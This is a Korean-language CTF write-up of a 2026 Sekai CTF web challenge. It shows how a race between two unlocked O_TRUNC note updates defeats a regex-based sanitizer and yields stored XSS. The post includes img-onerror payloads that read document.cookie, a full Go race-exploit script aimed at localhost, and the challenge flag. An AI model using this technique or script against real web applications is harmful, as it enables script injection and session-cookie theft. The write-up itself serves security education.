---
title: "&lt;_w+ Write-Up"
date: 2026-07-09
categories: ["CTF", "Write-Up"]
tags: ["Sekai", "CTF", "Web", "Race Condition"]
summary: "2026 Sekai CTF에서 출제된 Web 문제인 `&`lt;_w+ 분석 및 Write Up"
---

## Intro

안녕하세요!

최근에 2026 Sekia CTF에 참가하며, 여러 문제를 경험하고 왔습니다.<br>
오늘은 그 중에서 Web으로 출제된 문제 하나를 분석해보려 합니다.

현재 인스턴스는 막힌 상태라, 제공받은 로컬 파일로 서버를 띄운 뒤 풀이를 진행하겠습니다!
<br> <br>

---

## 00_문제 설명

``` json
{
  "Title": "&lt;_w+",
  "Description": "HTML unescape + Regex to delete all = What can I do?"
}
```

일단 문제를 읽어봅시다.

풀고 나니 보이는 건지, **Description**에서 많은 힌트를 주고 있습니다. <br>
일단 `HTML unescape` 라고 하는 것과 문제 제목의 `&lt`를 통해, **HTML Entity를 다시 실제 문자**로 바꾸는 과정이 있을 것 같다는 생각이 듭니다.

또한 `Regex to delete all`을 보면, 서버가 HTML 태그를 파서로 안전하게 처리하는 게 아니라 **정규식**으로 지우고 있을 것 같네요.

서버를 직접 띄우고 살펴 보겠습니다.
<br> <br>

---

## 01_문제 서버 및 코드 분석

서버를 띄운 뒤, localhost:8080으로 접속해보면 아래와 같은 모습이 확인 가능합니다.

<img src="/img/posts/sekai_web_ltw_main.png" width="500">

위에 `XSS Challenge!`라는 말이 써 있어서, <br>
`'아~ XSS 취약점 문젠갑다~'`<br>
라고 생각이 듭니다.

자세한 분석을 위해 소스 코드를 확인해보겠습니다.
<br> <br>

### 01-1_sanitizer() 함수 분석

서버의 핵심 코드는 `sanitizer()`입니다. 

```go
func sanitizer(msg string) (string, error) {
	if len(msg) > 128 {
		return "", fmt.Errorf("too long message")
	}

	if utf8.ValidString(msg) == false {
		return "", fmt.Errorf("invalid character")
	}

	sanitized := bluemonday.StrictPolicy().Sanitize(msg)

	sanitized = strings.ReplaceAll(sanitized, "&lt;", "<")
	sanitized = strings.ReplaceAll(sanitized, "&gt;", ">")
	var reHTML = regexp.MustCompile(`<(/)?\w+`)

	sanitized = reHTML.ReplaceAllString(sanitized, "")

	return sanitized, nil
}
```
<br>

함수의 데이터 처리 순서를 정리하면 아래와 같습니다.
```markdown
1. 입력 길이가 128바이트 이하인지 확인한다.
2. UTF-8 문자열인지 확인한다.
3. bluemonday.StrictPolicy()로 HTML을 sanitize한다.
4. &lt; 를 < 로 바꾼다.
5. &gt; 를 > 로 바꾼다.
6. 정규식 <(/)?\w+ 에 걸리는 부분을 삭제한다.
```

마지막 정규식은 `<` 뒤에 단어 문자가 오는 패턴을 지우게 됩니다.<br>
따라서 `<script` / `img` / `<svg`와 같은 태그 시작 부분이 삭제되게 됩니다.

이런 이유로 단순 XSS Payload로 Exploit을 시도하면 실패하게 됩니다.<br>
하나 예시를 통해 이해를 돕겠습니다!
<br> <br>


아래와 같은 payload를 넣는다고 가정하겠습니다.
```html
&lt;img src=x onerror=console.log(document.cookie)&gt;
```

그러면 중간에 `&lt;`와 `&gt;`는 `<`와 `>`로 바뀌고, 아래와 같은 모습을 갖출겁니다.
```html
<img src=x onerror=console.log(document.cookie)>
```

하지만 최종적으로 정규식이 `<img` 부분을 삭제하며, 아래와 같은 깨진 문자열만 남게 됩니다!
```html
 src=x onerror=console.log(document.cookie)>
```

이는 태그가 아니므로 JS가 실행되지 않게 됩니다.<br>
초반에는 정규식 필터를 어떤식으로 우회할지 고민을 하게 되고, 삽질을 시작합니다..

그러나 진짜 취약점은 note를 수정하는 `PUT /notes/{id}` 부분에 있습니다.
<br>
<br>

### 01-2_PUT /notes/{id} 로직 분석

```go
f, err := os.OpenFile(filePath, os.O_WRONLY|os.O_TRUNC, 0644)
...
f.Write([]byte(sanitized))
```

위 코드는 note를 수정하는 로직 부분입니다. 중간을 일부 생략하였습니다!<br>
여기서 가장 중요한 부분인 `O_TRUNC`는 파일을 여는 순간 기존 파일 내용을 전부 비우게 됩니다.
<br><br>

note 수정의 동작 로직을 파악해보겠습니다.
```markdown
1. 파일을 연다.
2. O_TRUNC 때문에 기존 파일 내용이 비워진다.
3. sanitize된 문자열을 쓴다.
```

중요한 점은 이 과정에서 File Lock이 없다는 것입니다.<br>
만약 같은 note에 대해 두 개의 `PUT` 요청이 동시에 들어오면, 각 요청의 `O_TRUNC`와 `Write()`가 서로 섞일 수 있습니다.<br>
그러면 각각의 입력은 **sanitizer를 정상적으로 통과**했는데, **최종 파일에는 sanitizer가 직접 만든 적 없는 HTML이 저장**될 수 있게 됩니다!

<br>

---

## 02_Exploit Ideation

지금까지 파악한 취약점을 토대로 Exploit을 설계해 보겠습니다.<br>

먼저 우리가 만들고 싶은 Payload는 아래와 같습니다.

```html
<img src=x onerror=console.log(document.cookie)>
```

이대로 넣으면 `<img`가 정규식에 의해 삭제되기 때문에, Payload를 두 개로 나누었습니다.

```text
p1 = <
p2 = *img src=x onerror=console.log(document.cookie)>
```
<br>

`p1`과 `p2`는 각각 보면 위험하지 않지만, 아래와 같은 Race 순서를 거치면 익스가 가능해집니다.

```markdown
1. p1 요청이 파일을 연다.
   O_TRUNC 때문에 파일이 비워진다.

2. p2 요청이 파일을 연다.
   다시 O_TRUNC 때문에 파일이 비워진다.

3. p2 요청이 긴 문자열을 쓴다.
   파일 내용:
   *img src=x onerror=console.log(document.cookie)>

4. p1 요청이 자신의 파일 offset 0에 < 한 글자를 쓴다.
```

이 과정을 거치면, p2가 써둔 첫 글자 `*`가 p1의 `<`로 덮이게 됩니다.<br>
최종적으로 우리가 원하던 
```html
<img src=x onerror=console.log(document.cookie)>
```
HTML 태그를 만들게 됩니다!

<br>

---

## 03_Exploit

> 본 블로그에 첨부한 익스 코드는 admin bot 환경에 맞게 `console.log(document.cookie)`를 사용하도록 정리한 버전입니다!

분석한 결과를 토대로 짠 Exploit은 아래와 같습니다!

<details>
<summary>Exploit Code</summary>

```go
package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

const (
	baseURL = "http://localhost:8080"
)

func createNote(message string) (string, error) {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.PostForm(baseURL+"/create", url.Values{"message": {message}})
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusSeeOther {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("failed to create note: %s", string(body))
	}

	location := resp.Header.Get("Location")
	id := strings.TrimPrefix(location, "/notes/")
	return id, nil
}

func updateNote(id, message string) error {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	form := url.Values{"message": {message}}
	req, err := http.NewRequest(
		"PUT",
		fmt.Sprintf("%s/notes/%s", baseURL, id),
		strings.NewReader(form.Encode()),
	)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusSeeOther {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("failed to update note: %s", string(body))
	}

	return nil
}

func getNote(id string) (string, error) {
	resp, err := http.Get(fmt.Sprintf("%s/notes/%s", baseURL, id))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("failed to get note: %s", string(body))
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func main() {
	payload := "<img src=x onerror=console.log(document.cookie)>"

	p1 := "<"
	p2 := "*" + payload[1:]

	id, err := createNote("foo")
	if err != nil {
		fmt.Println("create error:", err)
		return
	}

	fmt.Println("note id:", id)
	fmt.Println("url:", fmt.Sprintf("%s/notes/%s", baseURL, id))

	for {
		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			if err := updateNote(id, p2); err != nil {
				fmt.Println("update p2 error:", err)
			}
		}()

		go func() {
			defer wg.Done()
			if err := updateNote(id, p1); err != nil {
				fmt.Println("update p1 error:", err)
			}
		}()

		wg.Wait()

		content, err := getNote(id)
		if err != nil {
			fmt.Println("get error:", err)
			return
		}

		fmt.Println("now:", content)

		if content == payload {
			fmt.Println("pwned!", content)
			fmt.Println("Report this ID:", id)
			fmt.Println("URL:", fmt.Sprintf("%s/notes/%s", baseURL, id))
			return
		}

		time.Sleep(50 * time.Millisecond)
	}
}
```

</details>

최종적으로 실제 대회에서는 `SEKAI{l0g1c_l1v3s_1n_c0d3..._vuln_l1v3s_1n_t1m3!}` 라는 FLAG를 획득할 수 있었습니다.

<br>

---

## 04_Outro

오늘 분석한 문제는 그렇게 높은 난이도의 문제는 아니지만, 그럼에도 좋은 시사점을 주는 문제입니다.<br>

겉보기에는 `xss를 사용해야 하나?` 라는 생각이 들지만, 알고 보면 File Lock이 없다는 부분을 이용한 Race Condition 문제이기에 재밌다고 생각듭니다!!
<br><br>

다음에는 좀 더 어려운 Web 문제를 분석 및 리뷰해보는 시간을 가져보도록 하겠습니다.

읽어주셔서 감사합니다🤭🤭